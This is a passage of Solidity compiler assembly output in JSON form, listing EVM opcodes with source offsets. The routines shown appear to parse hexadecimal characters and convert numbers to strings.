											"value": "82"
										},
										{
											"begin": 8721,
											"end": 8745,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8771,
											"end": 8773,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 8765,
											"end": 8773,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8765,
											"end": 8773,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8765,
											"end": 8773,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8765,
											"end": 8773,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "tag",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8805,
											"end": 8807,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 8799,
											"end": 8801,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8799,
											"end": 8807,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8799,
											"end": 8807,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8799,
											"end": 8807,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8799,
											"end": 8807,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8819,
											"end": 8821,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 8813,
											"end": 8815,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8813,
											"end": 8821,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8813,
											"end": 8821,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8813,
											"end": 8821,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8813,
											"end": 8821,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "tag",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 8798,
											"end": 8822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8794,
											"end": 8865,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8794,
											"end": 8865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 8794,
											"end": 8865,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8848,
											"end": 8850,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 8842,
											"end": 8850,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8842,
											"end": 8850,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8842,
											"end": 8850,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8842,
											"end": 8850,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8794,
											"end": 8865,
											"name": "tag",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 8794,
											"end": 8865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "tag",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8717,
											"end": 8865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8639,
											"end": 8865,
											"name": "tag",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 8639,
											"end": 8865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8889,
											"end": 8891,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 8883,
											"end": 8885,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8883,
											"end": 8891,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8883,
											"end": 8891,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8883,
											"end": 8891,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8883,
											"end": 8891,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8903,
											"end": 8906,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 8897,
											"end": 8899,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8897,
											"end": 8906,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8897,
											"end": 8906,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8897,
											"end": 8906,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8897,
											"end": 8906,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "tag",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 8882,
											"end": 8907,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8933,
											"end": 8935,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 8927,
											"end": 8935,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8927,
											"end": 8935,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8927,
											"end": 8935,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8927,
											"end": 8935,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "tag",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8967,
											"end": 8969,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 8961,
											"end": 8963,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8961,
											"end": 8969,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8961,
											"end": 8969,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8961,
											"end": 8969,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8961,
											"end": 8969,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8981,
											"end": 8983,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 8975,
											"end": 8977,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "tag",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 8960,
											"end": 8984,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9010,
											"end": 9012,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 9004,
											"end": 9012,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9004,
											"end": 9012,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9004,
											"end": 9012,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9004,
											"end": 9012,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "tag",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9044,
											"end": 9046,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9038,
											"end": 9040,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9038,
											"end": 9046,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9038,
											"end": 9046,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9038,
											"end": 9046,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9038,
											"end": 9046,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9058,
											"end": 9060,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 9052,
											"end": 9054,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9052,
											"end": 9060,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9052,
											"end": 9060,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9052,
											"end": 9060,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9052,
											"end": 9060,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "tag",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9037,
											"end": 9061,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9033,
											"end": 9104,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9033,
											"end": 9104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9033,
											"end": 9104,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9089,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9081,
											"end": 9089,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9089,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9089,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9089,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9033,
											"end": 9104,
											"name": "tag",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9033,
											"end": 9104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "tag",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 8956,
											"end": 9104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "tag",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 8878,
											"end": 9104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9137,
											"end": 9139,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9132,
											"end": 9134,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9127,
											"end": 9129,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9127,
											"end": 9134,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 9127,
											"end": 9139,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9117,
											"end": 9140,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9117,
											"end": 9140,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9117,
											"end": 9140,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 9117,
											"end": 9140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8510,
											"end": 8511,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 8505,
											"end": 8511,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8505,
											"end": 8511,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8505,
											"end": 8511,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8505,
											"end": 8511,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8472,
											"end": 9151,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 8472,
											"end": 9151,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8472,
											"end": 9151,
											"name": "tag",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 8472,
											"end": 9151,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8472,
											"end": 9151,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9175,
											"end": 9180,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9181,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8276,
											"end": 9188,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8276,
											"end": 9188,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8276,
											"end": 9188,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8276,
											"end": 9188,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8018,
											"end": 8108,
											"name": "tag",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 8018,
											"end": 8108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8069,
											"end": 8073,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8092,
											"end": 8101,
											"name": "PUSH",
											"source": 0,
											"value": "C1B01A5"
										},
										{
											"begin": 8085,
											"end": 8101,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8085,
											"end": 8101,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8018,
											"end": 8108,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8018,
											"end": 8108,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "tag",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9783,
											"end": 9796,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 9809,
											"end": 9819,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9822,
											"end": 9823,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9809,
											"end": 9823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9809,
											"end": 9823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9833,
											"end": 9839,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9842,
											"end": 9843,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9833,
											"end": 9843,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9833,
											"end": 9843,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "tag",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9865,
											"end": 9866,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9860,
											"end": 9861,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9860,
											"end": 9866,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9882,
											"end": 9889,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9908,
											"end": 9910,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "tag",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9903,
											"end": 9910,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "tag",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 9853,
											"end": 9921,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9930,
											"end": 9946,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 9959,
											"end": 9964,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "101"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 21,
											"end": 27,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 17,
											"end": 31,
											"name": "MUL",
											"source": -1
										},
										{
											"begin": 124,
											"end": 128,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 108,
											"end": 122,
											"name": "CALLDATASIZE",
											"source": -1
										},
										{
											"begin": 100,
											"end": 106,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 87,
											"end": 129,
											"name": "CALLDATACOPY",
											"source": -1
										},
										{
											"begin": 155,
											"end": 159,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 147,
											"end": 153,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 143,
											"end": 160,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 164,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "tag",
											"source": 0,
											"value": "101"
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9949,
											"end": 9965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9930,
											"end": 9965,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9930,
											"end": 9965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9980,
											"end": 9986,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9987,
											"end": 9988,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9980,
											"end": 9988,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9980,
											"end": 9988,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "tag",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9992,
											"end": 9997,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9990,
											"end": 9991,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9990,
											"end": 9997,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10026,
											"end": 10028,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10022,
											"end": 10023,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "tag",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10022,
											"end": 10028,
											"name": "MOD",
											"source": 0
										},
										{
											"begin": 10018,
											"end": 10028,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 10018,
											"end": 10028,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10063,
											"end": 10083,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 10080,
											"end": 10081,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10063,
											"end": 10073,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 10063,
											"end": 10083,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 10063,
											"end": 10083,
											"name": "tag",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 10063,
											"end": 10083,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10045,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10058,
											"end": 10059,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10054,
											"end": 10055,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10046,
											"end": 10051,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 10046,
											"end": 10055,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10046,
											"end": 10059,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
